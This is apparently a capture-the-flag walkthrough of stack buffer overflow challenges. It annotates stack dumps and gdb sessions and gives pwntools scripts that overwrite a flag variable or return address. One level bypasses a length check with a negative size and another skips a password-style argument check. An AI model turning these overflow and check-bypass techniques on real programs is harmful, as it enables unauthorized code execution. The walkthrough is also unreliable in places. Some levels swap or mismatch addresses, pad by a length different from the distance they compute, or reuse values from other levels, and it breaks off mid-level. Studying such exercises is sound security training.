## level 1.0

> Overflow a buffer on the stack to set the right conditions to obtain the flag!

From the information that we have been provided and by looking at the stack, we can make a few modifications that can help us better understand the challenge.


```
            +---------------------------------+-------------------------+--------------------+
            |                  Stack location |            Data (bytes) |      Data (LE int) |
            +---------------------------------+-------------------------+--------------------+
esp ------> | 0x00007fff5e6805e0 (rsp+0x0000) | f0 05 68 5e ff 7f 00 00 | 0x00007fff5e6805f0 |
            | 0x00007fff5e6805e8 (rsp+0x0008) | e8 17 68 5e ff 7f 00 00 | 0x00007fff5e6817e8 |
            | 0x00007fff5e6805f0 (rsp+0x0010) | d8 17 68 5e ff 7f 00 00 | 0x00007fff5e6817d8 |
            | 0x00007fff5e6805f8 (rsp+0x0018) | 00 4a 23 d3 01 00 00 00 | 0x00000001d3234a00 |
            | 0x00007fff5e680600 (rsp+0x0020) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
            | 0x00007fff5e680608 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
            | 0x00007fff5e680610 (rsp+0x0030) | 20 06 68 5e ff 7f 00 00 | 0x00007fff5e680620 | <------ *buff
            | 0x00007fff5e680618 (rsp+0x0038) | 94 06 68 5e ff 7f 00 00 | 0x00007fff5e680694 | <------ *win
            | 0x00007fff5e680620 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | \
            | 0x00007fff5e680628 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  \
            | 0x00007fff5e680630 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   | 
            | 0x00007fff5e680638 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff5e680640 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff5e680648 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff5e680650 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |---- buffer
            | 0x00007fff5e680658 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   | 
            | 0x00007fff5e680660 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff5e680668 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff5e680670 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff5e680678 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff5e680680 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  / 
            | 0x00007fff5e680688 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | /
            | 0x00007fff5e680690 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | <------ win
            | 0x00007fff5e680698 (rsp+0x00b8) | 00 4a 23 d3 24 fd 59 d9 | 0xd959fd24d3234a00 |
ebp ------> | 0x00007fff5e6806a0 (rsp+0x00c0) | e0 16 68 5e ff 7f 00 00 | 0x00007fff5e6816e0 | <------ saved ebp of previous frame
            | 0x00007fff5e6806a8 (rsp+0x00c8) | e8 3d 60 8c 02 56 00 00 | 0x000056028c603de8 | <------ return address
            +---------------------------------+-------------------------+--------------------+
```


In this case, the pointer to the buffer is stored at `(rsp+0x0030)` and the pointer to the `win` variable is located at `(rsp+0x0038)`. These are not to be confused with the actual location of the buffer or the win variable.

The actual `win` variable is located right after the buffer, at `(rsp+0x00b4)`.

In order to overwrite the variable, we have to first overflow the buffer, whose size is 115 bytes.

So the buffer and `win` variable, are located as follows:

```
Buffer:                           Padding byte:           Win variable:

00 00 00 00 00 00 00 00           00                      00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
```

So as soon as the buffer ends, we have a single `NULL` byte, possibly a `padding byte`. And then we have our win variable which is 4 bytes long.

This means that we need to provide a payload of (115 + 1 + 4) bytes.

We are going to use pwntools in order to craft our payload.

```python
from pwn import *

padding = b'A' * 116
payload = padding + p64(0x42424242)

p = process('/challenge/babymem_level1.0')
p.recvuntil('size:')
p.sendline('120')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

As we can see we have successfully overwritten the win function.

&nbsp;

## level 1.1

> Overflow a buffer on the stack to set the right conditions to obtain the flag!

This time we are not given any information by the program.

In order to create a payload we need to know three things:

* [ ] Location of buffer.
* [ ] Location of win variable.

You could use [IDA](https://hex-rays.com/ida-pro/) or [Ghidra](https://ghidra-sre.org/), for this task, but we will use good old `gdb`.

```
gef➤  run

; -- snip --
Send your payload (up to 10 bytes)!
```

Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.

```
gef➤  finish
Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ffc615eeba0, nbytes=0xa) at ../sysdeps/unix/sysv/linux/read.c:26
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program has now read our payload.

The `read` syscall takes the following arguments:

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

Let's check the value of $rsi.

```
gef➤  p $rsi
$2 = 0x7fff4cbdb280
```

Now we know that the buffer starts at `0x7ffc615eeba0`.

Let's disassemble the program:

```
gef➤  disassemble
Dump of assembler code for function challenge:

; -- snip --
0x000055cd9f2cae9c <+283>:   mov    rax,QWORD PTR [rbp-0x58]
0x000055cd9f2caea0 <+287>:   mov    eax,DWORD PTR [rax]
0x000055cd9f2caea2 <+289>:   test   eax,eax
0x000055cd9f2caea4 <+291>:   je     0x55cd9f2caeb0 <challenge+303>
0x000055cd9f2caea6 <+293>:   mov    eax,0x0
0x000055cd9f2caeab <+298>:   call   0x55cd9f2cac84 <win>
; -- snip --
```

This block of code decides whether we get the flag or not.

We can see that the `cmp` instruction is comparing whether the value stored in $eax has been changed.

And from the two lines above, we learn that the value in $eax is moved from dereferenced `[rbp-0x58]`.

Let's check the value of `[rbp-0x58]`:

```
gef➤  x/a $rbp - 0x58
0x7fff4cbdb278: 0x7fff4cbdb2c4
```

The location of the win variable is `0x7ffc615eec14`.

So we have all the information we need:

* [x] Location of buffer: `0x7fff4cbdb280`.
* [x] Location of win variable: `0x7fff4cbdb2c4`.

Let's find the distance between the buffer and win variable in order to get the length of our payload padding.

```
gef➤  p/d 0x7fff4cbdb2c4 - 0x7fff4cbdb280
$3 = 68
```

We are all set to craft our payload.

```python
from pwn import *

padding = b'A' * 68
payload = padding + p64(0x42424242)

p = process('/challenge/babymem_level1.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

&nbsp;

## level 2.0

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!


```
	    +---------------------------------+-------------------------+--------------------+
	    |                  Stack location |            Data (bytes) |      Data (LE int) |
	    +---------------------------------+-------------------------+--------------------+
esp ------> | 0x00007fff85a4bc80 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
            | 0x00007fff85a4bc88 (rsp+0x0008) | 78 ce a4 85 ff 7f 00 00 | 0x00007fff85a4ce78 |
	    | 0x00007fff85a4bc90 (rsp+0x0010) | 68 ce a4 85 ff 7f 00 00 | 0x00007fff85a4ce68 |
	    | 0x00007fff85a4bc98 (rsp+0x0018) | 23 57 70 85 01 00 00 00 | 0x0000000185705723 |
	    | 0x00007fff85a4bca0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
	    | 0x00007fff85a4bca8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
	    | 0x00007fff85a4bcb0 (rsp+0x0030) | c0 bc a4 85 ff 7f 00 00 | 0x00007fff85a4bcc0 | <------ *buff
	    | 0x00007fff85a4bcb8 (rsp+0x0038) | 18 bd a4 85 ff 7f 00 00 | 0x00007fff85a4bd18 | <------ *win
	    | 0x00007fff85a4bcc0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | \
	    | 0x00007fff85a4bcc8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  \
            | 0x00007fff85a4bcd0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007fff85a4bcd8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007fff85a4bce0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007fff85a4bce8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |---- buffer
	    | 0x00007fff85a4bcf0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007fff85a4bcf8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007fff85a4bd00 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007fff85a4bd08 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  /
            | 0x00007fff85a4bd10 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | /
	    | 0x00007fff85a4bd18 (rsp+0x0098) | 00 00 00 00 31 56 00 00 | 0x0000563100000000 | <------ win
	    | 0x00007fff85a4bd20 (rsp+0x00a0) | 70 cd a4 85 ff 7f 00 00 | 0x00007fff85a4cd70 |
            | 0x00007fff85a4bd28 (rsp+0x00a8) | 00 c3 81 59 29 d1 5f cb | 0xcb5fd1295981c300 |
ebp ------> | 0x00007fff85a4bd30 (rsp+0x00b0) | 70 cd a4 85 ff 7f 00 00 | 0x00007fff85a4cd70 | <------ saved ebp of previous frame
	    | 0x00007fff85a4bd38 (rsp+0x00b8) | 22 ef b6 1b 31 56 00 00 | 0x000056311bb6ef22 | <------ return address
            +---------------------------------+-------------------------+--------------------+
```


The buffer is 87 bytes long, which means that it only covers 7 bytes out of the word at `(rsp+0x0090)`.

```
Buffer:                           Padding byte:           Win variable:

00 00 00 00 00 00 00 00           00                      00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 
```

The buffer ends, we have a null byte and then we have our win variable.

We have to change the value of the win variable to `0x2dbba028`.

Let's build our payload.

```python
from pwn import *

padding = b'A' * 88
payload = padding + p64(0x2dbba028)

p = process('/challenge/babymem_level2.0')
p.recvuntil('size:')
p.sendline('120')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

* We successfully overwrote the variable.

&nbsp;

## level 2.1

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

This time we are not given any information by the program.

In order to create a payload we need to know three things:

* [ ] Location of buffer.
* [ ] Location of win variable.
* [ ] Value being compared to win variable.

Let's open the program in `gdb`.

```
gef➤  run

; -- snip --
Send your payload (up to 10 bytes)!
```

Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.

```
gef➤  finish
Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ffc615eeba0, nbytes=0xa) at ../sysdeps/unix/sysv/linux/read.c:26
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program has now read our payload.

The `read` syscall takes the following arguments:

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.

```
gef➤  p $rsi
$2 = 0x7ffc615eeba0
```

Now we know that the buffer starts at `0x7ffc615eeba0`.

Let's disassemble the program:

```
gef➤  disassemble
Dump of assembler code for function challenge:

; -- snip --
0x0000564a9d7c246a <+264>:   mov    rax,QWORD PTR [rbp-0x88]
0x0000564a9d7c2471 <+271>:   mov    eax,DWORD PTR [rax]
0x0000564a9d7c2473 <+273>:   cmp    eax,0x47ba9894
0x0000564a9d7c2478 <+278>:   jne    0x564a9d7c2484 <challenge+290>
0x0000564a9d7c247a <+280>:   mov    eax,0x0
0x0000564a9d7c247f <+285>:   call   0x564a9d7c2265 <win>
; -- snip --
```

This block of code decides whether we get the flag or not.

We can see that the `cmp` instruction is comparing `0x47ba9894` with the value stored in $eax.

And from the two lines above, we learn that the value in $eax is moved from dereferenced `[rbp-0x88]`.

Let's check the value of `[rbp-0x88]`:

```
gef➤  x/a $rbp - 0x88
0x7ffc615eeb98: 0x7ffc615eec14
```

The location of the win variable is `0x7ffc615eec14`.

So we have all the information we need:

* [x] Location of buffer: `0x7ffc615eec14`
* [x] Location of win variable: `0x7ffc615eeba0`
* [x] Value being compared to win variable: `0x47ba9894`

Let's find the distance between the buffer and win variable in order to get the length of our payload padding.

```
gef➤  p/d 0x7fff0c8f8e98 - 0x7fff0c8f8e10
$3 = 136
```

We are all set to craft our payload.

```python
from pwn import *

padding = b'A' * 116
payload = padding + p64(0x47ba9894)

p = process('/challenge/babymem_level2.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

&nbsp;

## level 3.0

> Overflow a buffer and smash the stack to obtain the flag!


```
            +---------------------------------+-------------------------+--------------------+
            |                  Stack location |            Data (bytes) |      Data (LE int) |
            +---------------------------------+-------------------------+--------------------+
esp ------> | 0x00007ffd2e328c00 (rsp+0x0000) | a0 e4 b2 ce d6 7f 00 00 | 0x00007fd6ceb2e4a0 |
            | 0x00007ffd2e328c08 (rsp+0x0008) | b8 9d 32 2e fd 7f 00 00 | 0x00007ffd2e329db8 |
            | 0x00007ffd2e328c10 (rsp+0x0010) | a8 9d 32 2e fd 7f 00 00 | 0x00007ffd2e329da8 |
            | 0x00007ffd2e328c18 (rsp+0x0018) | dd 75 9d ce 01 00 00 00 | 0x00000001ce9d75dd |
            | 0x00007ffd2e328c20 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | 
            | 0x00007ffd2e328c28 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  
            | 0x00007ffd2e328c30 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | \  
            | 0x00007ffd2e328c38 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  \ 
	    | 0x00007ffd2e328c40 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007ffd2e328c48 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |---- buffer
	    | 0x00007ffd2e328c50 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007ffd2e328c58 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007ffd2e328c60 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  /
	    | 0x00007ffd2e328c68 (rsp+0x0068) | 00 9c 32 2e fd 7f 00 00 | 0x00007ffd2e329c00 | / 
	    | 0x00007ffd2e328c70 (rsp+0x0070) | d0 11 40 00 00 00 00 00 | 0x00000000004011d0 |
	    | 0x00007ffd2e328c78 (rsp+0x0078) | 30 8c 32 2e fd 7f 00 00 | 0x00007ffd2e328c30 |
ebp ------> | 0x00007ffd2e328c80 (rsp+0x0080) | b0 9c 32 2e fd 7f 00 00 | 0x00007ffd2e329cb0 | <------ saved ebp of previous frame
	    | 0x00007ffd2e328c88 (rsp+0x0088) | 9f 2a 40 00 00 00 00 00 | 0x0000000000402a9f | <------ return address
	    +---------------------------------+-------------------------+--------------------+
```


This time there's no pointer to the buffer or to the win variable as there is no win variable in the first place.

In order to execute the `win` function, we have to overwrite the return address with the address of the `win` function.

```
Buffer:                           Padding byte:                     Return address:

00 00 00 00 00 00 00 00              f2 93 28 fd 7f 00 00           9f 2a 40 00 00 00 00 00 
00 00 00 00 00 00 00 00           d0 11 40 00 00 00 00 00
00 00 00 00 00 00 00 00           50 e2 93 28 fd 7f 00 00
00 00 00 00 00 00 00 00           d0 f2 93 28 fd 7f 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 
```

Let's open the program in `gdb`.

```
(gdb) disassemble win

; -- snip --
Dump of assembler code for function win:
   0x000000000040236c <+0>:     endbr64 
; -- snip --
```

As we can see the location of the `win` function is `0x000000000040236c`.

Let's craft our payload.

```python
from pwn import *

padding = b'A' * 88
payload = padding + p64(0x000000000040236c)

p = process('/challenge/babymem_level3.0')
p.recvuntil('size:')
p.sendline('120')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

&nbsp;

## level 3.1

> Overflow a buffer and smash the stack to obtain the flag!

In order to create a payload we need to know three things:

* [ ] Location of buffer.
* [ ] Location of stored return address.
* [ ] Address of win function.

```
gef➤  run

; -- snip --
Send your payload (up to 10 bytes)!
```

* Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.

```
gef➤  finish
Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ffc615eeba0, nbytes=0xa) at ../sysdeps/unix/sysv/linux/read.c:26
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program has now read our payload.

The `read` syscall takes the following arguments:

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.

```
gef➤  p $rsi
$2 = 0x7fff0c8f8e10
```

In this challenge, we have no `win` variable to overwrite.

The way we can divert flow of the program is by overwriting the return address.

We know that the base pointer `$rbp` points to the saved base pointer of the caller function.

Let's check this:

```
gef➤  x/a $rbp
0x7fff0c8f8e90: 0x7fff0c8f9ec0
```

The base pointer `$rbp` has the value `0x7fff0c8f8e90` and it points to `0x7fff0c8f9ec0` which is the `$rbp` of the caller function.

And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.

```
gef➤  x/a $rbp + 8
0x7fff0c8f8e98: 0x4024be <main+238>
```

As we can see the return address is `<main+238>` and it is located at `0x7fff0c8f8e98`.

We want to replace this value with the address of the `win` function.

```
gef➤  disass win
Dump of assembler code for function win:
   0x0000000000402184 <+0>:     endbr64 
; -- snip --
```

As we can see the `win` function starts at `0x0000000000402184`.

We now have the information we need:

* [x] Location of buffer: `0x7fff0c8f8e10`.
* [x] Location of stored return address: `0x7fff0c8f8e98`.
* [x] Address of win function: `0x0000000000402184`.

Let's calculate the padding required.

```
gef➤  p/d 0x7fff0c8f8e98 - 0x7fff0c8f8e10
$3 = 136
```

We can now create our payload.

```python
from pwn import *

padding = b'A' * 136
payload = padding + p64(0x402184)

p = process('/challenge/babymem_level3.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

&nbsp;

## level 4.0

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

Our stack frame looks something like this:


```
	    +---------------------------------+-------------------------+--------------------+
	    |                  Stack location |            Data (bytes) |      Data (LE int) |
	    +---------------------------------+-------------------------+--------------------+
rsp ------> | 0x00007ffd173983c0 (rsp+0x0000) | a0 d4 01 6a 59 7f 00 00 | 0x00007f596a01d4a0 |
	    | 0x00007ffd173983c8 (rsp+0x0008) | 78 95 39 17 fd 7f 00 00 | 0x00007ffd17399578 |
	    | 0x00007ffd173983d0 (rsp+0x0010) | 68 95 39 17 fd 7f 00 00 | 0x00007ffd17399568 |
            | 0x00007ffd173983d8 (rsp+0x0018) | dd 65 ec 69 01 00 00 00 | 0x0000000169ec65dd |
            | 0x00007ffd173983e0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
	    | 0x00007ffd173983e8 (rsp+0x0028) | a0 16 02 6a 00 00 00 00 | 0x000000006a0216a0 |
	    | 0x00007ffd173983f0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | \
	    | 0x00007ffd173983f8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  \
	    | 0x00007ffd17398400 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
	    | 0x00007ffd17398408 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |---- buffer
       	    | 0x00007ffd17398410 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
       	    | 0x00007ffd17398418 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |   |
            | 0x00007ffd17398420 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  /
            | 0x00007ffd17398428 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | /
            | 0x00007ffd17398430 (rsp+0x0070) | d0 11 40 00 00 00 00 00 | 0x00000000004011d0 |
            | 0x00007ffd17398438 (rsp+0x0078) | f0 83 39 17 fd 7f 00 00 | 0x00007ffd173983f0 |
rbp ------> | 0x00007ffd17398440 (rsp+0x0080) | 70 94 39 17 fd 7f 00 00 | 0x00007ffd17399470 | <------ saved ebp of previous frame
            | 0x00007ffd17398448 (rsp+0x0088) | 87 2a 40 00 00 00 00 00 | 0x0000000000402a87 | <------ return address
            +---------------------------------+-------------------------+--------------------+
```


Again, we have to overwrite the return address in order to divert control flow.

```
Buffer:                           Random bytes:                     Return address:

00 00 00 00 00 00 00 00                                00           87 2a 40 00 00 00 00 00
00 00 00 00 00 00 00 00           d0 11 40 00 00 00 00 00
00 00 00 00 00 00 00 00           f0 83 39 17 fd 7f 00 00
00 00 00 00 00 00 00 00           70 94 39 17 fd 7f 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00
```

Let's find the address of the `win` function.


```
(gdb) disassemble win

; -- snip --
Dump of assembler code for function win:
   0x00000000004022cb <+0>:     endbr64 
; -- snip --
```


The program does not want us to overflow the buffer, so it tries to ensure that the payload size we set is lower than the buffer size.

However we can use the concept of [two's compliment](https://en.wikipedia.org/wiki/Two's\_complement) to our advantage.

The two's-compliment of `-1` is `0xffffffff`. If we enter the payload size to be `-1`, the program will interpret it as an unsigned `4294967295` instead of a signed `-1`.

And thus, we can pass the check.

Let's craft our payload:

```python
from pwn import *

padding = b'A' * 88
payload = padding + p64(0x00000000004022cb)

p = process('/challenge/babymem_level4.0')
p.recvuntil('size:')
p.sendline('-1')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

&nbsp;

## level 4.1

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

In order to create a payload we need to know three things:

* [ ] Location of buffer.
* [ ] Location of stored return address.
* [ ] Address of win function.

```
gef➤  run

; -- snip --
Send your payload (up to 10 bytes)!
```

Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.

```
gef➤  finish
Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ffc615eeba0, nbytes=0xa) at ../sysdeps/unix/sysv/linux/read.c:26
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program has now read our payload.

The `read` syscall takes the following arguments:

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.

```
gef➤  p $rsi
$2 = 0x7ffd98ad7380
```

In this challenge, we have no `win` variable to overwrite.

The way we can divert flow of the program is by overwriting the return address.

We know that the base pointer `$rbp` points to the saved base pointer of the caller function.

Let's check this:

```
gef➤  x/a $rbp
0x7ffd98ad73d0: 0x7ffd98ad8400
```

The base pointer `$rbp` has the value `0x7fff0c8f8e90` and it points to `0x7fff0c8f9ec0` which is the `$rbp` of the caller function.

And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.

```
gef➤  x/a $rbp + 8
0x7ffd98ad73d8: 0x401c6b <main+238>
```

As we can see the return address is `main+238` and it is located at `0x7ffd98ad73d8`.

We want to replace this value with the address of the `win` function.

```
gef➤  disass win
Dump of assembler code for function win:
   0x0000000000401958 <+0>:     endbr64 
; -- snip --
```

As we can see the win function starts at `0x0000000000401958`.

We now have the information we need:

* [x] Location of buffer: `0x7ffd98ad7380`.
* [x] Location of stored return address: `0x7ffd98ad73d8`.
* [x] Address of win function: `0x0000000000401958`.

Let's calculate the padding required.

```
gef➤  p/d 0x7ffd98ad73d8 - 0x7ffd98ad7380
$3 = 88
```

We can now create our payload.

```python
from pwn import *

padding = b'A' * 88
payload = padding + p64(0x0000000000401958)

p = process('/challenge/babymem_level4.1')
p.recvuntil('size:')
p.sendline('-1')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

&nbsp;

## level 6.0

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!

In this level, the `win_authed` function checks if it's argument is `0x1337`. If it isn't, we don't get the flag.

For now, instead of trying to pass it, we will just skip over this check.

```
            +---------------------------------+-------------------------+--------------------+
            |                  Stack location |            Data (bytes) |      Data (LE int) |
	    +---------------------------------+-------------------------+--------------------+
sp -------> | 0x00007ffe14fb8750 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
            | 0x00007ffe14fb8758 (rsp+0x0008) | e8 98 fb 14 fe 7f 00 00 | 0x00007ffe14fb98e8 |
            | 0x00007ffe14fb8760 (rsp+0x0010) | d8 98 fb 14 fe 7f 00 00 | 0x00007ffe14fb98d8 |
            | 0x00007ffe14fb8768 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
            | 0x00007ffe14fb8770 (rsp+0x0020) | a0 34 20 fa 38 7f 00 00 | 0x00007f38fa2034a0 |
            | 0x00007ffe14fb8778 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
	    | 0x00007ffe14fb8780 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | \
	    | 0x00007ffe14fb8788 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  |------ buffer
	    | 0x00007ffe14fb8790 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |  |
	    | 0x00007ffe14fb8798 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 | /
  	    | 0x00007ffe14fb87a0 (rsp+0x0050) | d0 11 40 00 00 00 00 00 | 0x00000000004011d0 |
	    | 0x00007ffe14fb87a8 (rsp+0x0058) | 80 87 fb 14 fe 7f 00 00 | 0x00007ffe14fb8780 |
bp -------> | 0x00007ffe14fb87b0 (rsp+0x0060) | e0 97 fb 14 fe 7f 00 00 | 0x00007ffe14fb97e0 | <------- saved bp of previous frame
            | 0x00007ffe14fb87b8 (rsp+0x0068) | 8e 1e 40 00 00 00 00 00 | 0x0000000000401e8e | <------- return address
	    +---------------------------------+-------------------------+--------------------+
```

Let's look at the `win_authed` function in `gdb`.

```
gef➤  disass win_authed
Dump of assembler code for function win_authed:
   0x00000000004016c4 <+0>:     endbr64 
   0x00000000004016c8 <+4>:     push   rbp
   0x00000000004016c9 <+5>:     mov    rbp,rsp
   0x00000000004016cc <+8>:     sub    rsp,0x10
   0x00000000004016d0 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x00000000004016d3 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x00000000004016da <+22>:    jne    0x4017d2 <win_authed+270>
   0x00000000004016e0 <+28>:    lea    rdi,[rip+0xa09]        # 0x4020f0
   ; -- snip --
```

We can see that the instruction at `0x00000000004016d3` is performing the check and the next instruction is making the jump.

In order to skip the check, we have to set the return address to `0x00000000004016e0`.

Before we do that we need to know the distance between the start of the buffer and location of return address.

```
Buffer:                           Random bytes:                     Return address:

00 00 00 00 00 00 00 00           d0 11 40 00 00 00 00 00          8e 1e 40 00 00 00 00 00
00 00 00 00 00 00 00 00           80 87 fb 14 fe 7f 00 00
00 00 00 00 00 00 00 00           e0 97 fb 14 fe 7f 00 00
00 00 00 00 00 00 00 00           
```

As we can see the distance is `56` bytes. This means we need `56` bytes of padding in order to overwrite the return address.

```python
from pwn import *

padding = b'A' * 56
payload = padding + p64(0x00000000004016e0)

p = process('/challenge/babymem_level6.0')
p.recvuntil('size:')
p.sendline('500')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

&nbsp;

## level 6.1

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!

In order to create a payload we need to know three things:

* [ ] Location of buffer.
* [ ] Location of stored return address.
* [ ] Address of win function.

```
gef➤  run

; -- snip --
Send your payload (up to 10 bytes)!
```

Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.

```
gef➤  finish
Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ffc615eeba0, nbytes=0xa) at ../sysdeps/unix/sysv/linux/read.c:26
